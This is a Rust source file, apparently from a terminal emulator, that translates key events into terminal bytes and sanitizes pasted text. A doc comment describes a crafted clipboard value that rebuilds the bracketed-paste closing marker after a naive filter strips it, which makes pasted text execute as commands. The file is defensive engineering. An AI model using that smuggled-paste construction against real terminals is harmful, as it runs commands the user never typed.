//! Which bytes each key sends to the program.
//!
//! It is a pure function from a window event to the bytes a terminal would send. It writes
//! nowhere: the one that sends them is the loop, and where it sends them through is the bridge.
//!
//! **Where this milestone stops, and why.** Alt, the function keys and the numeric
//! keypad are left out. None of them is needed to type commands in a shell or to move around an editor,
//! which is what the milestone has to be able to demonstrate; and the three of them drag along a decision that is not
//! the one to make here —Alt prepends an escape to what the key sends, and the other two change their bytes
//! depending on the mode the program is in—. Adding them without being able to see them working would be writing
//! tables blind. What is left out returns silence, never an approximate byte: a wrong
//! byte is understood by the program inside as a different key, and that is worse than receiving nothing.

use eframe::egui::{Context, Event, Key, Modifiers};
use std::borrow::Cow;

/// The bytes that correspond to an event, or nothing if that event does not translate.
pub fn bytes(event: &Event) -> Option<Cow<'static, [u8]>> {
    match event {
        // The text already comes resolved by the system: accents, dead keys and input methods
        // included. Translating it from the physical key instead of from here would be badly redoing
        // the desktop's work.
        Event::Text(text) if !text.is_empty() => Some(Cow::Owned(text.as_bytes().to_vec())),

        // **Copy and cut never arrive as keys, and paste arrives as one only when there was nothing
        // to paste.** The layer that translates the operating system's events looks at Ctrl+C, Ctrl+X
        // and Ctrl+V *before* emitting anything and turns them into copy, cut and paste, without
        // emitting the key event. On a normal desktop that is what is expected; in a terminal, Ctrl+C
        // is the way to interrupt a hung program, so they have to be caught through this door or
        // nothing gets interrupted.
        //
        // The exception is the paste chord over a clipboard holding no text — an image, or nothing.
        // That case used to be swallowed whole and now falls through as an ordinary key, which is the
        // whole of **D33**; the arm below is what keeps the application's own paste shortcut from
        // riding that fall-through into the program.
        //
        // **What this costs, said plainly:** as long as the clipboard does not exist, in this window
        // you cannot copy. These events do not carry the modifiers, so from here there is no
        // way to tell Ctrl+C from Ctrl+Shift+C —which is how you copy in a terminal—, and
        // both end up interrupting. Whoever brings the clipboard will have to decide it earlier,
        // in the loop, where the modifier state is indeed available.
        Event::Copy => Some(Cow::Borrowed(&[3])),
        Event::Cut => Some(Cow::Borrowed(&[24])),
        // **The two shortcuts arrive here, and through this door they are indistinguishable.** The desktop emits
        // the same `Paste` for Ctrl+V and for Ctrl+Shift+V, with no modifiers. The one that decides which
        // is which is the loop, which reconstructs the modifiers by walking the events in order and
        // calls [`paste`] when appropriate; what reaches here is the case without Shift.
        //
        // And that case **does not paste**: Ctrl+V is worth in a terminal what the control byte is worth, which is
        // «the next thing, literal» for a shell and the visual block for vim. Stealing it to paste
        // would be removing two things that are used daily. That a program inside decides that for it
        // that byte means paste —Claude does— is its own business, and it keeps working that way.
        Event::Paste(_) => Some(Cow::Borrowed(&[22])),

        // **The application's own paste shortcut is not handed to the program, whatever the
        // clipboard held.** Since D33 the framework stops swallowing this chord when there is
        // nothing to paste, so `Ctrl+Shift+V` over a copied image now arrives here as a key — and
        // `key_bytes` lets Shift through on purpose, because Shift does not change a control code.
        // Without this arm, pressing the terminal's *paste* shortcut with a screenshot on the
        // clipboard would open visual block in `vim`: a chord of the application reaching the
        // program inside, which is the one thing D11 and D13 both refuse.
        //
        // **`Ctrl+V` is deliberately not here**: that chord belongs to the program (D11), and
        // delivering its byte is what lets whoever runs in the pane go and read the clipboard image
        // for itself. Silence for one and the byte for the other is the whole distinction.
        Event::Key {
            key: Key::V,
            pressed: true,
            modifiers,
            ..
        } if modifiers.shift && (modifiers.ctrl || modifiers.command) => None,

        // Releasing a key sends nothing. The repeat of holding it down does: it is what makes
        // holding an arrow down move the cursor.
        Event::Key {
            key,
            pressed: true,
            modifiers,
            ..
        } => key_bytes(*key, *modifiers),

        _ => None,
    }
}

/// What is sent to the program when text is really pasted.
///
/// `bracketed` is what the program inside has requested: with it, the text goes surrounded by the two
/// sequences that say «this comes pasted», and a shell that understands them leaves it written instead of
/// executing it line by line.
///
/// **Line breaks come out as carriage return**, just like the Enter key and for the same
/// reason: it is what a terminal sends. Pasting «a⏎b» has to do exactly what typing a,
/// Enter, b does. Here there is only `\n` to convert, because the desktop already normalizes `\r\n` before
/// delivering it.
///
/// **All control characters except the tab and line breaks are removed from the text**,
/// and both halves of that sentence are needed.
///
/// The first reason is the wrapper. A clipboard copied from anywhere can bring its
/// closing sequence hidden; if it slipped through, it would close the mark on its own and whatever came
/// behind would arrive as if the user had typed it — **executing without Enter**, which is exactly
/// what the mark exists to prevent. The terminal engine filters nothing: it was checked, and there is not
/// a single mention of these sequences in the whole crate.
///
/// **And removing only that sequence is not enough, checked with an attack that worked.** Search-and-delete
/// makes one pass over the original and does not look again at what it leaves: with `ESC[2` + the closing + `01~`,
/// the only occurrence is in the middle, and on deleting it **the pieces on the sides join and form a
/// new closing** that no one sees any more.
///
/// **The second reason is worse, and the wrapper protects from it not at all.** Control characters
/// are processed by **the kernel's line discipline**, which sees the bytes *before* the
/// program: a `0x03` in the clipboard sends an interrupt to the foreground process, a
/// `0x1a` suspends the shell and leaves the pane looking dead, a `0x1c` triggers a dump, and
/// a `0x04` closes the input — and if the two consoles get closed, the whole window. Marking the
/// paste changes none of that, because the wrapper is a matter for the application inside and the kernel
/// acts first. It is for this that `xterm` and `VTE` have filtered paste's controls for years.
///
/// **What it costs, said plainly:** a text with color sequences loses its escapes and the rest
/// stays as plain text — pasting a colored dump leaves `[32mok[0m` on the line. It is the same
/// that `xterm` does with its default behavior, and it is accepted for the same reason: from here there is no
/// way to tell the control the user wanted from the one slipped in, and a terminal whose
/// paste can execute or suspend is worse than one that pastes as plain text.
///
/// It is filtered **also when it is not wrapped**: the mode is consulted when composing and the program may
/// have changed it right after; and the kernel's danger does not depend on the wrapper.
///
/// **It is not `pub`, and that is the point.** Composing a paste without going through the gate is
/// exactly the bug: an ungated door sitting beside the gated one, equally reachable and better
/// named, is one autocomplete away from being used. [`paste_or_hold`] is the only way out.
fn paste(text: &str, bracketed: bool) -> Vec<u8> {
    const OPENS: &[u8] = b"\x1b[200~";
    const CLOSES: &[u8] = b"\x1b[201~";

    // It is composed in one pass and with the reservation made: the clipboard can be megabytes and this
    // runs on the thread that paints.
    let mut body = Vec::with_capacity(text.len() + OPENS.len() + CLOSES.len());
    if bracketed {
        body.extend_from_slice(OPENS);
    }
    let before = body.len();

    // **How a line break comes out depends on whether there is a mark, and slipping up here shows on screen.**
    //
    // *Without a mark*, the program cannot tell the pasted from the typed, so the key has to be
    // imitated: Enter sends **carriage return**, and pasting «a, break, b» has to do the same as
    // typing a, Enter, b.
    //
    // *With a mark*, the text goes **as is**: the program knows it is a paste and it decides what to do
    // with the breaks —a modern shell leaves the two lines written without executing either—. Sending it
    // there a carriage return is sending it **a control character inside a text**, and what it does
    // is insert it literally: a box appears in the middle of the command and `echo` prints it. Checked on
    // screen, which is how it was discovered.
    let newline = if bracketed { b'\n' } else { b'\r' };

    for byte in text.bytes() {
        match byte {
            // The desktop already normalizes the pairs before delivering it, so a lone carriage return that
            // arrives here came alone and is worth the same as a break.
            b'\n' | b'\r' => body.push(newline),
            b'\t' => body.push(b'\t'),
            0x00..=0x1f | 0x7f => {}
            other => body.push(other),
        }
    }

    // With nothing to send not even the mark is sent: an empty wrapper is noise that the program
    // inside has to interpret for nothing.
    if body.len() == before {
        return Vec::new();
    }

    if bracketed {
        body.extend_from_slice(CLOSES);
    }
    body
}

/// How long a line may be before the line discipline stops keeping it, or **nothing** on a platform
/// that does not answer the question.
///
/// **It is not `MAX_CANON`**, which is what this project called it until somebody ran `getconf`:
/// that is **255**, and `linux/limits.h` defines it as 255. What actually bounds a canonical line on
/// Linux is `N_TTY_BUF_SIZE`, a **compile-time constant of the kernel's `n_tty` driver** — not a
/// POSIX limit, not reachable through `termios`, and different on other kernels.
///
/// **So it is declared per platform and it is never a contract.** It is the threshold for asking a
/// question, not an assertion about what will arrive: getting it slightly wrong asks once too often
/// or once too seldom, and that is all it can cost. Anything that treated it as the truth — a test
/// asserting on it, a message quoting it as a guarantee — would be the mislabelled number this
/// project forbids.
///
/// Everything that is not Linux gets `None`, and there are two different reasons:
/// - **Windows has no such question.** ConPTY does its own input handling in `conhost`; there is no
///   line discipline, and `portable-pty` exposes no `termios` there at all — every one of its
///   accessors is `#[cfg(unix)]`.
/// - **macOS has a boundary and nobody has measured it.** Its headers name a different figure, and
///   copying a number out of a header nobody ran is exactly what the paragraph above refuses. F2.7 is
///   the milestone that has a Mac to measure it on.
pub const fn the_longest_line_a_reader_keeps() -> Option<usize> {
    #[cfg(target_os = "linux")]
    {
        // `N_TTY_BUF_SIZE` is 4 096 and the terminator has to fit inside it, so 4 095 **bytes** are
        // what survives — bytes and not characters, which is the unit the kernel counts and the one
        // this module measures. Measured, not read: a line of 4 095 arrives whole and one of 4 096
        // arrives as 4 095 plus its terminator.
        Some(4_095)
    }
    #[cfg(not(target_os = "linux"))]
    {
        None
    }
}

/// The longest run of bytes in a composed paste with no line terminator in it.
///
/// **Both terminators count.** An unwrapped paste sends a break as `\r` and a wrapped one as `\n`,
/// and the line discipline closes a line on either — `ICRNL` maps the first to the second, measured
/// on a fresh pseudoterminal. So a paste that carries breaks of either kind is delivered line by
/// line and only its longest line is at risk.
///
/// It is measured on the **composed** bytes and not on the text, because the paste markers are bytes
/// in the same line as the body: measured, a wrapped paste is truncated with its closing marker
/// inside the part that is dropped.
fn the_longest_line(composed: &[u8]) -> usize {
    composed
        .split(|byte| *byte == b'\n' || *byte == b'\r')
        .map(<[u8]>::len)
        .max()
        .unwrap_or(0)
}

/// A paste that was **not** sent, because one of its lines is longer than a program reading lines
/// would keep.
///
/// **It carries the TEXT and not the bytes**, and the first version carried the bytes with a
/// docblock arguing for it: *«so that saying yes sends exactly what would have been sent, and not a
/// second composition that could differ from the first»*. That reasoning was backwards, and a
/// reviewer found it.
///
/// A paste is composed against the mode the program is in — wrapped or not, and a break sent as
/// `\n` or as `\r` accordingly. The answer can come many frames later, and **the mode changes
/// underneath**: `bash` turns bracketed paste off while a command runs and on again at its prompt.
/// Bytes composed unwrapped carry `\r` between their lines; delivered to a prompt that has since
/// turned the wrapping on, the line editor **executes each line as it arrives** — which is this
/// ticket's own bug, reintroduced by the fix for it.
///
/// So the text is kept and composed **at the moment it is sent**, against the mode as it is then.
pub struct HeldPaste {
    text: String,
    longest: usize,
    /// The paste mode the question was asked in.
    ///
    /// **Only the tests read it**, and it is here so the claim above is checkable rather than
    /// trusted: a test that could not see the mode had moved could not prove the paste is composed
    /// against the one it goes out in.
    #[cfg(test)]
    bracketed_when_it_was_held: bool,
    /// The boundary this one was measured against, **kept rather than asked for again**.
    ///
    /// It makes the type's invariant sayable — `longest > ceiling` — instead of leaving it in the
    /// head of whoever built it, and it stops the sentence re-querying a platform value to describe
    /// something that was fixed when the paste was held.
    ceiling: usize,
    /// How many further pastes arrived while this one was waiting and were **not** taken.
    ///
    /// It exists because the first version of this feature reintroduced its own bug one layer up: a
    /// second over-long paste replaced the first, and the first went **without a word** — the exact
    /// silent loss the whole thing was built to stop. Found in review. Now the first question stands
    /// and the later ones are counted into it, so nothing goes without being said.
    turned_away: usize,
    /// Whether the keyboard reaches the console this question is standing on.
    ///
    /// **It is written by the pass that knows the focus and read by the one that paints**, and the
    /// order between them is what makes that safe: the mouse is attended to before anything is
    /// painted, so the answer here is this frame's and not the previous one's.
    ///
    /// It sits on the paste and not in the painter's arguments **because there is nowhere else for
    /// it to go**: the window's core is against D28's recorded number and may not gain a line, which
    /// includes the call that paints a console — whose own docblock says it exists to avoid a
    /// seventh argument for exactly that reason.
    ///
    /// **It starts `true`, because that is the only value that is ever correct at birth.** A question
    /// is created while attending to the keyboard, which reaches the **focused** console — so a
    /// question nobody has marked yet is standing on the console the keys do reach. It started
    /// `false` for one afternoon, described as «the safe way round», and a review pointed out that
    /// the docblock convicted itself: there is no frame on which `false` is right there, so the
    /// wrong value was being justified instead of removed. It never showed either way, because the
    /// mouse pass rewrites the mark in the same frame before anything is painted; the point is that
    /// now there is no state that should not exist.
    within_reach: bool,
}

impl HeldPaste {
    /// What the person in front of the screen is told: **how long the line is** and **that the loss
    /// would be silent**. Which key answers is added by whoever paints it — it is a fact about this
    /// application's keys, not about this paste.
    ///
    /// It does not quote the boundary as a promise. The threshold is one platform's kernel constant
    /// (see [`the_longest_line_a_reader_keeps`]), and a sentence that said «only 4 095 will arrive»
    /// would be asserting something this application cannot know: what reaches the program depends
    /// on the mode it is in **when the bytes land**, and that changes at every command boundary.
    ///
    /// **It counts bytes and says bytes.** The kernel's boundary is in bytes, and calling them
    /// characters would overstate the loss on anything that is not ASCII — a mislabelled number is
    /// the thing this project forbids, and a mislabelled unit is the same defect.
    pub fn sentence(&self) -> String {
        let also = match self.turned_away {
            0 => String::new(),
            1 => " Another paste arrived while this one was waiting and was not taken.".to_owned(),
            more => format!(
                " {more} further pastes arrived while this one was waiting and were not taken."
            ),
        };
        format!(
            "this paste has a line of {} bytes, and a program that reads lines the plain way keeps \
             only about {} of them — the rest would be dropped with nothing said, and what is left \
             can be a different command from the one you can read.{also}",
            self.longest, self.ceiling
        )
    }

    /// Records that another paste arrived and was not taken, so the standing question can say so.
    fn and_another(&mut self) {
        self.turned_away += 1;
    }

    /// Records whether the keyboard reaches the console this question stands on.
    ///
    /// **A setter, and its name says so.** An earlier version of it read like a question and
    /// answered none, which a review took apart.
    pub fn reached_by_the_keyboard_now(&mut self, reached: bool) {
        self.within_reach = reached;
    }

    /// Whether the keys its notice can name would actually arrive.
    pub fn reached_by_the_keyboard(&self) -> bool {
        self.within_reach
    }

    /// How long the offending line is.
    ///
    /// **Only the tests call it.** Its docblock used to say «for whoever paints» and the painter
    /// never did: a comment naming a caller that does not exist is the same defect as a comment
    /// naming a symbol that does not exist, which this crate has a guard for.
    #[cfg(test)]
    fn longest(&self) -> usize {
        self.longest
    }

    /// Yes: compose it **now**, against the mode the program is in at this moment.
    ///
    /// Not the mode it was in when the question was asked — see this type's own docblock for why
    /// that is the difference between a paste and an execution.
    pub fn send_anyway(self, bracketed: bool) -> Vec<u8> {
        paste(&self.text, bracketed)
    }

    /// Whether the paste mode has changed since the question was asked.
    ///
    /// Only the tests care today; it exists so that the fact above is checkable rather than trusted.
    #[cfg(test)]
    fn the_mode_moved(&self, bracketed: bool) -> bool {
        self.bracketed_when_it_was_held != bracketed
    }
}

/// What the person in front of the screen said about a held paste.
enum Answer {
    /// Send it, boundary and all.
    Send,
    /// Throw it away.
    Discard,
    /// Nothing yet.
    Waiting,
}

/// Reads the answer to a held paste, **consuming the key that gives it**.
///
/// Consuming matters: with the question open, a chord that also reached the program would run
/// whatever is on the shell's line, which is the opposite of what somebody answering «discard»
/// meant. Everything else is left where it was — a held paste does not deafen the console, so what
/// is running keeps receiving whatever else is typed.
///
/// **The yes needs `Ctrl`, and a bare `Enter` is deliberately not it.** A reviewer found the
/// accident that decides this, and it runs the other way from the obvious one: with the question
/// standing, somebody types a command at the prompt and presses `Enter` to run it — and instead of
/// running, the held paste is appended onto the line they just typed. That combined line is over the
/// boundary **by construction**, so the kernel truncates it and the incident this whole thing exists
/// to prevent happens anyway, in silence. A bare `Enter` therefore stays the program's, and saying
/// yes costs a deliberate gesture. The notice names it.
fn answer_to_a_held(ctx: &Context) -> Answer {
    ctx.input_mut(|state| {
        if state.consume_key(Modifiers::CTRL, Key::Enter) {
            Answer::Send
        } else if state.consume_key(Modifiers::NONE, Key::Escape) {
            Answer::Discard
        } else {
            Answer::Waiting
        }
    })
}

/// Empties the buffer this pass writes its bytes into, and puts in it the answer to a held paste if
/// there is one: the bytes on a yes, nothing on a no, and the paste stays held while nobody answers.
///
/// **The emptying belongs here** and not at the call site, because the answer to a held paste is the
/// first thing a pass can produce: leaving the two apart is one order away from a pass that resolves
/// a paste and then wipes it.
///
/// Returns whether a paste came out, which the caller needs in order to keep it out of the keystroke
/// series — see the comment on the `Send` arm.
///
/// **And it lives in this module** because it is the same vocabulary as the rest of it — an event
/// in, bytes out — and because `lib.rs` carries **D28**'s ratchet: what goes into that file has to
/// fit under a recorded number, and this delivery's lines were paid for out of the very file they
/// were going into.
pub fn start_the_keys(
    ctx: &Context,
    held: &mut Option<HeldPaste>,
    keystrokes: &mut Vec<u8>,
    bracketed: bool,
) -> bool {
    keystrokes.clear();
    let Some(paste) = held.take() else {
        return false;
    };
    match answer_to_a_held(ctx) {
        Answer::Send => {
            keystrokes.extend_from_slice(&paste.send_anyway(bracketed));
            // **It says a paste came out, and the caller needs to be told.** The frame keeps a series
            // of what a keystroke costs from the key to the queue, and a paste is deliberately left
            // out of it so that a multi-kilobyte write does not distort the percentile **D3** judges
            // the framework by. On the frame that releases a held paste the walk sees no paste event,
            // so without this the released bytes would be timed as a keystroke.
            true
        }
        Answer::Discard => false,
        Answer::Waiting => {
            *held = Some(paste);
            false
        }
    }
}

/// Composes a paste and either **appends it** to what this pass sends, or hands it back held.
///
/// It writes into a destination rather than returning the bytes, the way this crate's other
/// producer does, so that the caller is one line: with `lib.rs` under **D28**'s ratchet, where the
/// lines go is decided by the ceiling and not by taste. **D28**'s ratchet fails above the number it
/// records, and this delivery had two lines of slack in that record to spend — see D31 and the
/// entry's own reason, where that slack is now closed.
///
/// `None` means it was appended. `Some` is a paste that was **not** appended and has to be put to
/// the person in front of the screen first. On a platform with no boundary to compare against
/// —Windows has none— nothing is ever held.
///
/// **Why holding rather than warning**, recorded here because it is the whole decision: nothing
/// reaches the program until the line closes, and once it closes the shell has already run the
/// truncated command. A warning would arrive after the incident and label it; this is the only one
/// of the two that prevents it.
///
/// **What it does NOT see, declared rather than left to be discovered.** The measurement is of this
/// paste alone. Whatever is **already** unterminated on the other side — text the user typed at the
/// prompt, or an earlier paste — is counted by the kernel and not by this: a short paste on top of a
/// long line still truncates, exactly as before. Reading that state is not possible from here, and
/// the honest framing is the one the investigation reached: this narrows the window, it does not
/// close it.
pub fn paste_or_hold(
    text: &str,
    bracketed: bool,
    destination: &mut Vec<u8>,
    held: &mut Option<HeldPaste>,
) {
    let composed = paste(text, bracketed);
    // **A wrapped paste is never held, and that is the difference between a gate and a nuisance.**
    // A program only turns the paste markers on if it handles pastes itself, and every program that
    // does is a line editor running in raw mode — `readline`, `zle`, `vim`, an agent's own console.
    // Raw mode has no canonical line buffer, so the boundary this gate exists for **cannot bite
    // there**. `readline` even turns the markers off before running a foreground command, which is
    // exactly the moment the shell goes canonical: the correlation is not a coincidence, it is the
    // same switch.
    //
    // It matters more here than anywhere: this is a terminal for hosting agents, and **pasting a
    // long prompt into an agent's console is the paste**. Holding those would put a false warning on
    // the one path that matters most, about a loss that cannot happen.
    //
    // What it gives up, said plainly: a canonical program that asked for the markers anyway would go
    // unguarded. Nothing does that, and if something ever does, the gate is one condition away.
    if bracketed {
        destination.extend_from_slice(&composed);
        return;
    }
    let longest = the_longest_line(&composed);
    let Some(ceiling) = the_longest_line_a_reader_keeps().filter(|ceiling| longest > *ceiling)
    else {
        // **A short paste goes through even with a question standing**, so the held bytes will land
        // *after* it if the answer is yes — the reverse of the order they were pasted in. It is the
        // price of not freezing the console over a question, and it is said here rather than left
        // for somebody to meet.
        destination.extend_from_slice(&composed);
        return;
    };
    // **A question already standing is not replaced.** Replacing it would drop the paste it was
    // about without a word, which is this feature's own bug one layer up — found in review, on the
    // line that used to read `paste_or_hold(…).or(self.held.take())`.
    match held {
        Some(standing) => standing.and_another(),
        none => {
            *none = Some(HeldPaste {
                text: text.to_owned(),
                #[cfg(test)]
                bracketed_when_it_was_held: bracketed,
                longest,
                ceiling,
                turned_away: 0,
                within_reach: true,
            });
        }
    }
}

fn key_bytes(key: Key, modifiers: Modifiers) -> Option<Cow<'static, [u8]>> {
    // Alt and the macOS command key are left out of the milestone, and «out» means silence: Alt
    // prepends an escape, so sending the bare byte would not be an approximation, it would be a different
    // key. Shift does pass, because it does not change the control code — it is what `xterm` does.
    if modifiers.alt || modifiers.mac_cmd {
        return None;
    }
    if modifiers.ctrl
        && let Some(control_byte) = with_ctrl(key)
    {
        return Some(Cow::Owned(vec![control_byte]));
    }
    // If Ctrl accompanies something that is not a letter, it falls to the usual table instead of going silent:
    // Ctrl+Enter sends carriage return just like Enter, and staying mute would be a dead key.
    let bytes_out: &'static [u8] = match key {
        // Carriage return, not line break: it is what a terminal sends, and what the program
        // inside translates as suits it.
        Key::Enter => b"\r",
        // With Shift, Tab is a different key: it backtabs instead of advancing, and it has
        // its own sequence. Sending the usual tab would move the focus the opposite of how the
        // program asked.
        Key::Tab if modifiers.shift => b"\x1b[Z",
        Key::Tab => b"\t",
        // Modern terminals send delete, not backspace. With the other byte, the shell deletes
        // but many editors do not.
        Key::Backspace => &[0x7F],
        Key::Escape => &[0x1B],
        // The four arrows in normal mode. A program can request application mode, in which
        // they change form; that is out of this milestone and is written above.
        Key::ArrowUp => b"\x1b[A",
        Key::ArrowDown => b"\x1b[B",
        Key::ArrowRight => b"\x1b[C",
        Key::ArrowLeft => b"\x1b[D",
        _ => return None,
    };
    Some(Cow::Borrowed(bytes_out))
}

/// Ctrl with a letter gives the control codes from 1 to 26.
///
/// It is the usual rule —the letter minus sixty-four— and it is the one that makes Ctrl+D close the
/// input and Ctrl+Z suspend.
///
/// The twenty-six are written one by one, and not taken from the key's name, even though that name
/// happens to be the letter itself today: that text is meant to be shown to a person in a
/// shortcut menu, it is not a contract. If it changes tomorrow, a control byte would change with it without
/// anything failing to compile.
fn with_ctrl(key: Key) -> Option<u8> {
    let control_byte = match key {
        Key::A => 1,
        Key::B => 2,
        Key::C => 3,
        Key::D => 4,
        Key::E => 5,
        Key::F => 6,
        Key::G => 7,
        Key::H => 8,
        Key::I => 9,
        Key::J => 10,
        Key::K => 11,
        Key::L => 12,
        Key::M => 13,
        Key::N => 14,
        Key::O => 15,
        Key::P => 16,
        Key::Q => 17,
        Key::R => 18,
        Key::S => 19,
        Key::T => 20,
        Key::U => 21,
        Key::V => 22,
        Key::W => 23,
        Key::X => 24,
        Key::Y => 25,
        Key::Z => 26,
        _ => return None,
    };
    Some(control_byte)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn chord_of(key: Key, modifiers: Modifiers) -> Option<Vec<u8>> {
        bytes(&Event::Key {
            key,
            physical_key: None,
            pressed: true,
            repeat: false,
            modifiers,
        })
        .map(|b| b.into_owned())
    }

    fn press(key: Key) -> Option<Vec<u8>> {
        chord_of(key, Modifiers::NONE)
    }

    fn press_with_ctrl(key: Key) -> Option<Vec<u8>> {
        chord_of(key, Modifiers::CTRL)
    }

    fn text(s: &str) -> Option<Vec<u8>> {
        bytes(&Event::Text(s.into())).map(|b| b.into_owned())
    }

    #[test]
    fn the_text_travels_as_is_in_utf8() {
        assert_eq!(text("ls"), Some(b"ls".to_vec()));
        // A character that is not ASCII takes several bytes and has to come out whole.
        assert_eq!(text("ñ"), Some(vec![0xC3, 0xB1]), "the ñ is two bytes");
    }

    #[test]
    fn the_empty_text_is_nothing_to_send_and_not_an_empty_list() {
        // Returning something empty would force the caller to tell «there is nothing to send» from «it
        // does not translate», which are the same decision for it.
        assert_eq!(text(""), None);
    }

    #[test]
    fn the_four_basic_control_keys() {
        // Carriage return, not line break.
        assert_eq!(press(Key::Enter), Some(vec![0x0D]));
        assert_eq!(press(Key::Tab), Some(vec![0x09]));
        // Delete, not backspace: with 0x08 the shell deletes but many editors do not.
        assert_eq!(press(Key::Backspace), Some(vec![0x7F]));
        assert_eq!(press(Key::Escape), Some(vec![0x1B]));
    }

    #[test]
    fn the_arrows_go_as_an_escape_sequence() {
        assert_eq!(press(Key::ArrowUp), Some(b"\x1b[A".to_vec()));
        assert_eq!(press(Key::ArrowDown), Some(b"\x1b[B".to_vec()));
        assert_eq!(press(Key::ArrowRight), Some(b"\x1b[C".to_vec()));
        assert_eq!(press(Key::ArrowLeft), Some(b"\x1b[D".to_vec()));
    }

    #[test]
    fn the_twenty_six_letters_land_in_their_place_and_none_strays() {
        let letters = [
            Key::A,
            Key::B,
            Key::C,
            Key::D,
            Key::E,
            Key::F,
            Key::G,
            Key::H,
            Key::I,
            Key::J,
            Key::K,
            Key::L,
            Key::M,
            Key::N,
            Key::O,
            Key::P,
            Key::Q,
            Key::R,
            Key::S,
            Key::T,
            Key::U,
            Key::V,
            Key::W,
            Key::X,
            Key::Y,
            Key::Z,
        ];
        for (i, key) in letters.iter().enumerate() {
            let expected = (i + 1) as u8;
            assert_eq!(
                press_with_ctrl(*key),
                Some(vec![expected]),
                "the letter at position {i} does not give its control code"
            );
        }
        // The two used daily, named so what is at stake reads clearly.
        assert_eq!(press_with_ctrl(Key::D), Some(vec![4]), "closes the input");
        assert_eq!(press_with_ctrl(Key::Z), Some(vec![26]), "suspends");
    }

    #[test]
    fn interrupt_cut_and_paste_arrive_through_their_own_door() {
        // The layer below keeps Ctrl+C, Ctrl+X and Ctrl+V and turns them into copy, cut
        // and paste before emitting any key. If this case disappeared, **Ctrl+C would stop
        // interrupting** and no key test would notice.
        assert_eq!(
            bytes(&Event::Copy).map(|b| b.into_owned()),
            Some(vec![3]),
            "Ctrl+C has to keep interrupting"
        );
        assert_eq!(bytes(&Event::Cut).map(|b| b.into_owned()), Some(vec![24]));
        assert_eq!(
            bytes(&Event::Paste("whatever there was".into())).map(|b| b.into_owned()),
            Some(vec![22]),
            "real pasting is for another milestone; here it is worth what it is worth in a terminal"
        );
    }

    /// **The chord that pastes must not reach the program, and the one that does not paste must.**
    ///
    /// Since D33 the framework stops swallowing the paste chord when the clipboard holds no text, so
    /// both of them arrive here as ordinary keys. `key_bytes` lets Shift through on purpose — Shift
    /// does not change a control code — so without the guard the application's own paste shortcut
    /// would send `\x16` into the program: press it with a screenshot copied, expecting a paste, and
    /// `vim` opens visual block.
    ///
    /// **Both halves in one test, because either alone passes over a live defect.** Asserting only
    /// the silence would stay green if the byte stopped coming out for `Ctrl+V` too, which is the bug
    /// D33 exists to fix. Asserting only the byte is what shipped the defect this test was written
    /// for.
    #[test]
    fn the_paste_shortcut_stays_in_the_terminal_and_the_bare_chord_goes_to_the_program() {
        let key = |modifiers| Event::Key {
            key: Key::V,
            physical_key: Some(Key::V),
            pressed: true,
            repeat: false,
            modifiers,
        };
        let ctrl = Modifiers {
            ctrl: true,
            command: true,
            ..Modifiers::NONE
        };
        let ctrl_shift = Modifiers {
            shift: true,
            ..ctrl
        };

        assert_eq!(
            bytes(&key(ctrl_shift)).map(|b| b.into_owned()),
            None,
            "the application's paste shortcut reached the program: with an image on the clipboard \
             the framework now hands this chord over as a key, and letting it through opens visual \
             block in vim where somebody meant to paste"
        );
        assert_eq!(
            bytes(&key(ctrl)).map(|b| b.into_owned()),
            Some(vec![22]),
            "Ctrl+V stopped delivering its control byte, which is the whole of D33: that byte is how \
             a program hosted in a pane is told to go and read the clipboard itself"
        );
    }

    #[test]
    fn a_letter_key_on_its_own_sends_nothing() {
        // The layer below emits **two** events for each normal keypress: the key and the text
        // it produces. If the key table also answered the letters, every character the
        // user typed would arrive doubled at the program inside. The text is the one that
        // rules, and the key has to stay silent.
        assert_eq!(press(Key::A), None);
        assert_eq!(press(Key::Z), None);
        assert_eq!(press(Key::Space), None);
        assert_eq!(press(Key::Num0), None);
        // And with shift the same: the «A» also travels as text.
        assert_eq!(chord_of(Key::A, Modifiers::SHIFT), None);
    }

    #[test]
    fn the_ctrl_of_linux_and_windows_also_travels_in_command() {
        // Outside macOS, Ctrl arrives marked in both places at once. Confusing that `command`
        // with the macOS command key **would leave Linux and Windows without any Ctrl**.
        //
        // It is tested with D and not with C, X or V: those three never arrive as a key because
        // the layer below turns them first into copy, cut and paste.
        let linux_ctrl = Modifiers {
            ctrl: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, linux_ctrl), Some(vec![4]));
    }

    #[test]
    fn the_macos_command_key_sends_no_control_bytes() {
        // On macOS ⌘ arrives without `ctrl` and with `mac_cmd`. If it were treated as any Ctrl,
        // ⌘+Q would ask to quit the application and would also send the byte that hangs the terminal's
        // output.
        let macos_command = Modifiers {
            mac_cmd: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::Q, macos_command), None);
        assert_eq!(chord_of(Key::Enter, macos_command), None);
    }

    #[test]
    fn shift_with_enter_is_still_carriage_return() {
        // Shift alone does not go through the control-code table, so it needs its own
        // test: if it were filtered the way Alt is filtered, **Shift+Enter would be a dead key**.
        assert_eq!(chord_of(Key::Enter, Modifiers::SHIFT), Some(vec![0x0D]));
    }

    #[test]
    fn shift_with_tab_backtabs_instead_of_advancing() {
        // It is the only key whose meaning Shift changes: with it the program
        // moves the focus back instead of forward. If this sent the usual tab,
        // **moving backward through a form would go forward**.
        assert_eq!(
            chord_of(Key::Tab, Modifiers::SHIFT),
            Some(b"\x1b[Z".to_vec())
        );
        assert_eq!(
            press(Key::Tab),
            Some(vec![0x09]),
            "and without Shift, it advances"
        );
    }

    #[test]
    fn the_byte_is_decided_by_the_logical_key_and_not_the_physical_one() {
        // The layer below sends both: the one the keyboard layout says and the physical
        // position. In a layout that is not the English one they do not match, and heeding the
        // position would send the control byte **of a different letter**.
        let in_another_layout = Event::Key {
            key: Key::D,
            physical_key: Some(Key::H),
            pressed: true,
            repeat: false,
            modifiers: Modifiers::CTRL,
        };
        assert_eq!(
            bytes(&in_another_layout).map(|b| b.into_owned()),
            Some(vec![4]),
            "closes the input, does not delete"
        );
    }

    #[test]
    fn shift_does_not_change_the_control_code() {
        // It is what a real terminal does: Ctrl+Shift+C sends the same as Ctrl+C.
        let ctrl_shift = Modifiers {
            ctrl: true,
            shift: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, ctrl_shift), Some(vec![4]));
    }

    #[test]
    fn alt_does_not_send_an_approximate_byte() {
        // Alt prepends an escape to what the key sends. Sending the bare byte would not be an
        // approximation: the program inside would understand it as a different keypress.
        let ctrl_alt = Modifiers {
            ctrl: true,
